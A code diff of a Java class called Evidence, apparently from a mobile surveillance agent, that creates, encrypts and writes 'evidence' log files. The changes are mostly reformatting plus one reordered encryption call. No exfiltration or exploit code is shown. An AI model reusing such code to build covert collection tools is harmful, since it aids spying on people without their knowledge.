@@ -150,8 +150,8 @@ public final class Evidence {
 
 	// Agent agent;
 	/** The agent id. */
-	//int agentId;
-	
+	// int agentId;
+
 	int typeEvidenceId;
 
 	/** The progressive. */
@@ -224,7 +224,7 @@ public final class Evidence {
 			final int typeLog = TYPE_EVIDENCE[agentPos];
 			return typeLog;
 		}
-	
+
 		// #ifdef DEBUG
 		debug.warn("Wrong agentId conversion: " + agentId);
 		// #endif
@@ -312,7 +312,7 @@ public final class Evidence {
 			return "LOC";
 		case 0xEDA1:
 			return "FSS";
-	
+
 		}
 		return "UNK";
 	}
@@ -324,18 +324,18 @@ public final class Evidence {
 	 */
 	private boolean enoughSpace() {
 		long free = 0;
-	
+
 		free = Path.freeSpace();
-	
+
 		if (free < MIN_AVAILABLE_SIZE) {
 			// #ifdef DEBUG
 			if (firstSpace) {
 				firstSpace = false;
-	
+
 				debug.fatal("not enough space. Free : " + free);
 			}
 			// #endif
-	
+
 			return false;
 		} else {
 			return true;
@@ -352,7 +352,7 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean close() {
-		//TODO: rinominare il file
+		// TODO: rinominare il file
 		final boolean ret = true;
 		encData = null;
 		fconn = null;
@@ -389,9 +389,9 @@ public final class Evidence {
 	 */
 	public synchronized boolean createEvidence(final byte[] additionalData,
 			final int typeEvidenceId) {
-		
+
 		this.typeEvidenceId = typeEvidenceId;
-		
+
 		// #ifdef DEBUG
 		debug.trace("createLog typeEvidenceId: " + typeEvidenceId);
 		// #endif
@@ -443,7 +443,7 @@ public final class Evidence {
 		Check.asserts(fileName != null, "null fileName");
 		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
 				"file not scrambled");
-		//Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
+		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
 		// #endif
 
 		// #ifdef DEBUG
@@ -465,7 +465,8 @@ public final class Evidence {
 			debug.info("Created: " + fileName);
 			// #endif
 
-			final byte[] plainBuffer = makeDescription(additionalData, typeEvidenceId);
+			final byte[] plainBuffer = makeDescription(additionalData,
+					typeEvidenceId);
 			// #ifdef DBC
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
 					"Short plainBuffer");
@@ -517,7 +518,8 @@ public final class Evidence {
 	 *            the log type
 	 * @return the byte[]
 	 */
-	public byte[] makeDescription(final byte[] additionalData, final int typeEvidenceId) {
+	public byte[] makeDescription(final byte[] additionalData,
+			final int typeEvidenceId) {
 
 		if (timestamp == null) {
 			timestamp = new Date();
@@ -639,6 +641,8 @@ public final class Evidence {
 	public synchronized boolean writeEvidence(final byte[] data,
 			final int offset) {
 
+		encData = encryption.encryptData(data, offset);
+
 		if (fconn == null) {
 			// #ifdef DEBUG
 			debug.error("fconn null");
@@ -646,7 +650,6 @@ public final class Evidence {
 			return false;
 		}
 
-		encData = encryption.encryptData(data, offset);
 		// #ifdef DEBUG
 		debug.info("writeEvidence encdata: " + encData.length);
 		debug.info("fileSize: " + fconn.getSize());
@@ -696,10 +699,10 @@ public final class Evidence {
 		return writeEvidence(buffer);
 	}
 
-    public byte[] getEncData(){
-        return encData;
-    }
-    
+	public byte[] getEncData() {
+		return encData;
+	}
+
 	/**
 	 * Info.
 	 * 
@@ -709,10 +712,11 @@ public final class Evidence {
 	public static void info(final String message) {
 		try {
 			// atomic info
-			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(message, true));
-			
-			//final Evidence logInfo = new Evidence(Agent.AGENT_INFO);
-			//logInfo.atomicWriteOnce(message);
+			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(
+					message, true));
+
+			// final Evidence logInfo = new Evidence(Agent.AGENT_INFO);
+			// logInfo.atomicWriteOnce(message);
 
 		} catch (final Exception ex) {
 			// #ifdef DEBUG
@@ -720,7 +724,6 @@ public final class Evidence {
 			// #endif
 		}
 	}
-
 
 	/**
 	 * Atomic write once.
